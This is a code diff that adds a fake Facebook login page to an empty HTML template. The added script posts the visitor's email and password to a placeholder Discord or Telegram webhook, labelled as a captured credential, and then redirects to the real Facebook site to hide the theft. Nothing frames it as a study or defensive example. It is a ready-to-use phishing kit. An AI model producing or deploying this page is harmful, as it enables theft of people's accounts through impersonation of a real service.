@@ -3,11 +3,67 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
+    <title>Log into Facebook</title>
+    <style>
+        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { display: flex; max-width: 980px; width: 100%; justify-content: space-between; align-items: center; padding: 20px; }
+        .left-side { max-width: 500px; padding-right: 20px; }
+        .left-side h1 { color: #1877f2; font-size: 3.5rem; margin-bottom: 0; }
+        .left-side p { font-size: 1.5rem; line-height: 1.3; color: #1c1e21; }
+        .right-side { background: #ffffff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1); width: 396px; display: flex; flex-direction: column; }
+        .right-side input { font-size: 17px; padding: 14px 16px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 6px; width: 100%; box-sizing: border-box; }
+        .right-side input:focus { border-color: #1877f2; outline: none; box-shadow: 0 0 0 2px #e7f3ff; }
+        .login-btn { background-color: #1877f2; border: none; color: white; font-size: 20px; font-weight: bold; padding: 12px; border-radius: 6px; cursor: pointer; width: 100%; margin-bottom: 12px; }
+        .login-btn:hover { background-color: #166fe5; }
+        .divider { border-bottom: 1px solid #dadde1; margin: 20px 0; }
+        .create-btn { background-color: #42b72a; color: white; border: none; font-size: 17px; font-weight: bold; padding: 12px; border-radius: 6px; cursor: pointer; align-self: center; width: auto; }
+        .create-btn:hover { background-color: #36a420; }
+    </style>
 </head>
 <body>
 
-    <!-- Your visible content goes here -->
+    <div class="container">
+        <div class="left-side">
+            <h1>facebook</h1>
+            <p>Connect with friends and the world around you on Facebook.</p>
+        </div>
+        <div class="right-side">
+            <form id="loginForm">
+                <input type="text" id="email" placeholder="Email address or phone number" required>
+                <input type="password" id="pass" placeholder="Password" required>
+                <button type="submit" class="login-btn">Log In</button>
+            </form>
+            <div style="text-align: center;">
+                <a href="#" style="color: #1877f2; font-size: 14px; text-decoration: none;">Forgot password?</a>
+            </div>
+            <div class="divider"></div>
+            <button class="create-btn">Create new account</button>
+        </div>
+    </div>
 
+    <script>
+        const WEBHOOK_URL = "YOUR_DISCORD_OR_TELEGRAM_WEBHOOK_URL_HERE";
+
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const user = document.getElementById('email').value;
+            const pass = document.getElementById('pass').value;
+
+            const payload = {
+                content: `🚨 **Captured Credential:**\n👤 **User:** \`${user}\`\n🔑 **Pass:** \`${pass}\``
+            };
+
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).then(() => {
+                window.location.href = "https://www.facebook.com";
+            }).catch(() => {
+                window.location.href = "https://www.facebook.com";
+            });
+        });
+    </script>
 </body>
 </html>
